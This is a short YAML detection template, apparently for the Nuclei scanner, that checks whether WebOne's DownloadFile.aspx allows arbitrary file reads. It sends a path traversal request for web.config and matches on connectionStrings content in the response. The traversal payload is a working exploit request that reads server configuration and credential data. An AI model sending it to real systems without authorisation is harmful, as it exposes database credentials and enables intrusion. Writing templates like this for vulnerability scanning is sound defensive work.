id: WebOne-DownloadFile-ReadAnyFile

info:
  name: WebOne-DownloadFile-ReadAnyFile
  author: iSee857
  severity: high
  description: |
    WebOne-DownloadFile-ReadAnyFile

http:
  - raw:
      - |
        GET /webForms/Download/DownloadFile.aspx?fileid=/../../web.config&flag=report HTTP/1.1
        Host: {{Hostname}}


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - <configuration>
          - connectionStrings>
        condition: and

      - type: status
        status:
          - 200